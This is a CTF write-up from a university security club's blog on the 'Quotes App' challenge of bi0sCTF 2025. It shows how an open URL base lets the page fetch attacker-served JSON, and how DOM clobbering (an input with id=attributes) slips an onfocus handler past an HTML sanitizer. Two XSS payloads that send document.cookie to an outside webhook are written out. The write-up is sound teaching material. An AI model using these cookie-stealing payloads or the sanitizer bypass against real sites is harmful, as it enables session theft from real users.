<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Quotes App</title><meta content="Quotes App" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/quotes_app/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Quotes App" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/quotes_app/ property=twitter:url><meta content="Quotes App" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/quotes_app/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>quotes_app</span></div><time datetime=2025-07-04>Published on: <span class=accent-data>2025-07-04</span></time><address rel=author>By <span class=accent-data> Arun Radhakrishnan, and exploiitm </span></address><h1>Quotes App</h1><h3 id=description>Description</h3><p>We’re given the code to a neat little website that chooses a random nice quote to display to you whenever you click the button.<div class=textCenter><img alt="Normal working of the app. Random quote is displayed corresponding to the quoteid param in the url." src=normal_working.png></div><h3 id=the-solution>The Solution</h3><p>Looking around the source code, we find a script called bot.py, which has a function visit_url. The function visits a given url and conveniently places our flag as a cookie before visiting. In app.py, we see that there’s an endpoint called /report. This site allows us to submit any url for our bot to visit. So… all we have to do is, get some site which can run some js code, pick up the cookie and send it to a webhook somewhere.<p>This is where the first trick comes up. Check this part of the code, where the api is called with the given quoteid param.<pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>buildApiUrl</span><span>(</span><span style=color:#fdf4c1>baseUrl</span><span>, </span><span style=color:#fdf4c1>quoteId</span><span>) {
</span><span>    </span><span style=color:#fa5c4b>return new </span><span style=color:#8ec07c>URL</span><span>(</span><span style=color:#fdf4c1>quoteId</span><span>, </span><span style=color:#b8bb26>`${</span><span style=color:#fabd2f>window</span><span style=color:#b8bb26>.</span><span style=color:#fabd2f>location</span><span style=color:#b8bb26>.</span><span style=color:#fdf4c1>origin</span><span style=color:#b8bb26>}${</span><span style=color:#fdf4c1>baseUrl</span><span style=color:#b8bb26>}`</span><span>)</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>toString</span><span>();
</span><span>}
</span><span>
</span><span style=color:#fa5c4b>async function </span><span style=color:#8ec07c>fetchQuote</span><span>(</span><span style=color:#fdf4c1>id</span><span>) {
</span><span>    </span><span style=color:#fa5c4b>try </span><span>{
</span><span>        </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>url </span><span style=color:#fe8019>= </span><span style=color:#8ec07c>buildApiUrl</span><span>(</span><span style=color:#b8bb26>"/api/quotes/"</span><span>, </span><span style=color:#fdf4c1>id</span><span>);
</span><span>        </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>response </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#fdf4c1>url</span><span>, { method: </span><span style=color:#b8bb26>"GET" </span><span>});
</span><span>
</span><span>        </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fe8019>!</span><span style=color:#fdf4c1>response</span><span>.</span><span style=color:#fdf4c1>ok</span><span>) {
</span><span>            </span><span style=color:#fa5c4b>throw new </span><span style=color:#8ec07c>Error</span><span>(</span><span style=color:#b8bb26>"Quote not found."</span><span>);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>data </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>await </span><span style=color:#fdf4c1>response.</span><span style=color:#8ec07c>json</span><span>();
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>data</span><span>.</span><span style=color:#fdf4c1>quote</span><span>;
</span><span>    } </span><span style=color:#fa5c4b>catch </span><span>(</span><span style=color:#fdf4c1>error</span><span>) {
</span><span>        </span><span style=color:#fa5c4b>throw </span><span style=color:#fdf4c1>error</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><p>Specifically, this line:<pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=color:#fa5c4b>return new </span><span style=color:#8ec07c>URL</span><span>(</span><span style=color:#fdf4c1>quoteId</span><span>, </span><span style=color:#b8bb26>`${</span><span style=color:#fabd2f>window</span><span style=color:#b8bb26>.</span><span style=color:#fabd2f>location</span><span style=color:#b8bb26>.</span><span style=color:#fdf4c1>origin</span><span style=color:#b8bb26>}${</span><span style=color:#fdf4c1>baseUrl</span><span style=color:#b8bb26>}`</span><span>)</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>toString</span><span>();
</span></code></pre><p>The URL function creates a url from the second param (base location) treating the first param as a relative path from the base location. But if the first parameter itself is a full URL, then it is just returned as is. So… we can just enter any website in /?quoteid=&LTenter any website here>, and the fetchQuote function will return just the quote value from the response and then give it back out to us.<p>This should make our solution pretty easy now. Just use some vps that can send custom responses, and feed that website as quoteid. In the response JSON that you send, place an item with key as quote and value as a script tag. Inside the script tag, write some js code to send document.cookie to a webhook of your choice.<pre class=language-json data-lang=json style=background:#282828;color:#fdf4c1aa><code class=language-json data-lang=json><span>{
</span><span>    </span><span style=color:#b8bb26>"quote"</span><span>: </span><span style=color:#b8bb26>"&LTscript type=\"javascript\">window.location = \"https:\\alpha.requestcatcher.com\test?flag=\" + document.cookie;<</span><span style=background:#932b1e;color:#fdf4c1>\s</span><span style=color:#b8bb26>cript>"
</span><span>}
</span></code></pre><p>Something like this should work well enough.<p>Except… before the quote value is displayed, it gets sanitised thoroughly - specifically checking against malicious HTML. sanitiser.js contains the following code:<pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>DefaultWhitelist </span><span style=color:#fe8019>= </span><span>{
</span><span>    </span><span style=color:#b8bb26>'*'</span><span>: [</span><span style=color:#b8bb26>'class'</span><span>, </span><span style=color:#b8bb26>'dir'</span><span>, </span><span style=color:#b8bb26>'id'</span><span>, </span><span style=color:#b8bb26>'lang'</span><span>, </span><span style=color:#b8bb26>'role'</span><span>, </span><span style=color:#fdf4c1>ARIA_ATTRIBUTE_PATTERN</span><span>],
</span><span>    a: [</span><span style=color:#b8bb26>'target'</span><span>, </span><span style=color:#b8bb26>'href'</span><span>, </span><span style=color:#b8bb26>'title'</span><span>, </span><span style=color:#b8bb26>'rel'</span><span>],
</span><span>    area: [],
</span><span>    b: [],
</span><span>    br: [],
</span><span>    </span><span style=font-style:italic;color:#928374>// more such values are there, check the full code for the whole list
</span><span>}
</span><span>
</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>sanitizeHtml</span><span>(</span><span style=color:#fdf4c1>unsafeHtml</span><span>, </span><span style=color:#fdf4c1>whiteList</span><span>) {
</span><span>    </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fdf4c1>unsafeHtml</span><span>.</span><span style=color:#fabd2f>length </span><span style=color:#fe8019>=== </span><span style=color:#d3869b>0</span><span>) {
</span><span>      </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>unsafeHtml
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fdf4c1>whiteList </span><span style=color:#fe8019>=== </span><span style=color:#d3869b>undefined</span><span>) {
</span><span>      </span><span style=color:#fdf4c1>whiteList </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>DefaultWhitelist
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>domParser </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>new </span><span style=color:#8ec07c>window</span><span>.</span><span style=color:#8ec07c>DOMParser</span><span>()
</span><span>    </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>createdDocument </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>domParser.</span><span style=color:#8ec07c>parseFromString</span><span>(</span><span style=color:#fdf4c1>unsafeHtml</span><span>, </span><span style=color:#b8bb26>'text/html'</span><span>)
</span><span>    </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>whitelistKeys </span><span style=color:#fe8019>= </span><span style=color:#8ec07c>Object</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>keys</span><span>(</span><span style=color:#fdf4c1>whiteList</span><span>)
</span><span>    </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>elements </span><span style=color:#fe8019>= </span><span>[].</span><span style=color:#fdf4c1>slice.</span><span style=color:#fabd2f>call</span><span>(</span><span style=color:#fdf4c1>createdDocument.</span><span style=color:#fabd2f>body</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>querySelectorAll</span><span>(</span><span style=color:#b8bb26>'*'</span><span>))
</span><span>  
</span><span>    </span><span style=color:#fa5c4b>for </span><span>(</span><span style=color:#fa5c4b>let </span><span style=color:#fdf4c1>i </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>, </span><span style=color:#fdf4c1>len </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>elements</span><span>.</span><span style=color:#fabd2f>length</span><span>; </span><span style=color:#fdf4c1>i </span><span style=color:#fe8019>< </span><span style=color:#fdf4c1>len</span><span>; </span><span style=color:#fdf4c1>i</span><span style=color:#fe8019>++</span><span>) {
</span><span>      </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>el </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>elements</span><span>[</span><span style=color:#fdf4c1>i</span><span>]
</span><span>      </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>elName </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>el.</span><span style=color:#fabd2f>nodeName</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>toLowerCase</span><span>()  
</span><span>      </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fdf4c1>whitelistKeys.</span><span style=color:#fabd2f>indexOf</span><span>(</span><span style=color:#fdf4c1>el.</span><span style=color:#fabd2f>nodeName</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>toLowerCase</span><span>()) </span><span style=color:#fe8019>=== -</span><span style=color:#d3869b>1</span><span>) {
</span><span>        </span><span style=color:#fdf4c1>el.</span><span style=color:#fabd2f>parentNode</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>removeChild</span><span>(</span><span style=color:#fdf4c1>el</span><span>)
</span><span>        </span><span style=color:#fa5c4b>continue
</span><span>      }
</span><span>  
</span><span>      </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>attributeList </span><span style=color:#fe8019>= </span><span>[].</span><span style=color:#fdf4c1>slice.</span><span style=color:#fabd2f>call</span><span>(</span><span style=color:#fdf4c1>el</span><span>.</span><span style=color:#fabd2f>attributes</span><span>)
</span><span>      </span><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>whitelistedAttributes </span><span style=color:#fe8019>= </span><span>[]</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>concat</span><span>(</span><span style=color:#fdf4c1>whiteList</span><span>[</span><span style=color:#b8bb26>'*'</span><span>] </span><span style=color:#fe8019>|| </span><span>[], </span><span style=color:#fdf4c1>whiteList</span><span>[</span><span style=color:#fdf4c1>elName</span><span>] </span><span style=color:#fe8019>|| </span><span>[])
</span><span>  
</span><span>      </span><span style=color:#fdf4c1>attributeList.</span><span style=color:#fabd2f>forEach</span><span>((</span><span style=color:#fdf4c1>attr</span><span>) </span><span style=color:#fa5c4b>=> </span><span>{
</span><span>        </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fe8019>!</span><span style=color:#8ec07c>allowedAttribute</span><span>(</span><span style=color:#fdf4c1>attr</span><span>, </span><span style=color:#fdf4c1>whitelistedAttributes</span><span>)) {
</span><span>          </span><span style=color:#fdf4c1>el.</span><span style=color:#fabd2f>removeAttribute</span><span>(</span><span style=color:#fdf4c1>attr</span><span>.</span><span style=color:#fabd2f>nodeName</span><span>)
</span><span>        }
</span><span>      })
</span><span>    }
</span><span>     
</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>createdDocument</span><span>.</span><span style=color:#fabd2f>body</span><span>.</span><span style=color:#fdf4c1>innerHTML
</span><span>}
</span></code></pre><p>Essentially, the above code treats the quote value as HTML code, and checks each element individually. If the tag is not in the whitelist (and yes, &LTscript> is not included in the whitelist), then the element is removed. Furthermore, all attributes of the element that are not in the whitelist are also removed (notably all onload, onfocus etc. attributes are removed).<p>Lucky for us though, there is a second very subtle trick to get around this constraint.<p>Look at the line:<pre class=language-js data-lang=js style=background:#282828;color:#fdf4c1aa><code class=language-js data-lang=js><span style=color:#fa5c4b>const </span><span style=color:#fdf4c1>attributeList </span><span style=color:#fe8019>= </span><span>[].</span><span style=color:#fdf4c1>slice.</span><span style=color:#fabd2f>call</span><span>(</span><span style=color:#fdf4c1>el</span><span>.</span><span style=color:#fabd2f>attributes</span><span>)
</span></code></pre><p>Logically, this line creates a list of all attributes of the element el.<p>However, this dot syntax under DOM has several meanings. Notably, if el had a child element of id x, then el.x would refer to that child. So… hypothetically, if someone made a child element of id = attributes, then el.attributes would start to refer to the child. And in this hypothetical scenario, el.attributes would no longer contain the list of all attributes to be removed by the whitelist.<p>There’s the trick. Instead of using a script tag, we can use a different (whitelisted) tag, say a form tag. We’ll have to include a child element (say an input tag) with id = attributes, to avoid the sanitisation. And then we can use any attribute in the form tag, such as the onfocus and autofocus attributes.<pre class=language-json data-lang=json style=background:#282828;color:#fdf4c1aa><code class=language-json data-lang=json><span>{</span><span style=color:#b8bb26>"quote"</span><span>: </span><span style=color:#b8bb26>"&LTform id=x onfocus=</span><span style=background:#932b1e;color:#fdf4c1>\'</span><span style=color:#b8bb26>window.location=\\\"https://alpha.requestcatcher.com/test?flag=\\\"+document.cookie</span><span style=background:#932b1e;color:#fdf4c1>\'</span><span style=color:#b8bb26> autofocus>&LTinput id=attributes>"</span><span>}
</span></code></pre><p>This should work just about perfect.<h3 id=trying-it-out>Trying it out</h3><p>I used pythonanywhere to send in my custom responses. I put in a custom cookie on a tab and opened the main webpage with my custome quoteid. Here’s what happened.<div class=textCenter><img alt="Screenshot of webpage before entering the malicious url. Also shows my custom cookie in the inspect tab" src=just_before_entering_url.png></div><div class=textCenter><img alt="Shows the request being captured with the cookie shown as a parameter" src=request_caught.png></div><p>Now, we just have to take this whole URL (https://&LTenter taskurl here>/?quoteid=&LTenter custom response site here>) and give it to our helpful bot under the /report page. And that’s it, flag acquired.<h3 id=bibliography>Bibliography</h3><p>Thanks to Solo_Way / Little computer demons and their writeup (<a href=https://ctftime.org/writeup/40313 rel=noopener target=_blank>https://ctftime.org/writeup/40313</a>) for a great explanation of the solution. All the new tricks mentioned here were taken from their writeup.<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>